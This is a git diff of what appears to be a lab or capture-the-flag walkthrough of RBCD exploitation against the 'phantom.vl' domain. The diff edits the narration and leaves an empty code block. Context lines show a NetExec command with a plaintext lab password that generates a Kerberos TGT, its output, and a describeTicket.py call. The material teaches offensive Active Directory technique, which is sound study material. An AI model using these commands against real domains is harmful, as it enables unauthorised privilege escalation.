@@ -664,6 +664,12 @@ https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267
 After checking the machine account quota, it is set to 0, so i cannot add a machine account and nor do i have access to one. To work around this ill have to use the SPN-less method
 
 ```python
+
+```
+
+First ill read the attribute then write to it to set the delegation
+
+```python
 nxc smb dc.phantom.vl -d phantom.vl -u wsilva -p 'Password123!' --generate-tgt wsilva
 SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.129.234.63   445    DC               [+] phantom.vl\wsilva:Password123! 
@@ -671,7 +677,7 @@ SMB         10.129.234.63   445    DC               [+] TGT saved to: wsilva.cca
 SMB         10.129.234.63   445    DC               [+] Run the following command to use the TGT: export KRB5CCNAME=wsilva.ccache
 ```
 
-First ill grab a TGT for the user configured for delegation
+Then ill grab a TGT for the user configured for delegation
 
 ```python
 describeTicket.py wsilva.ccache 
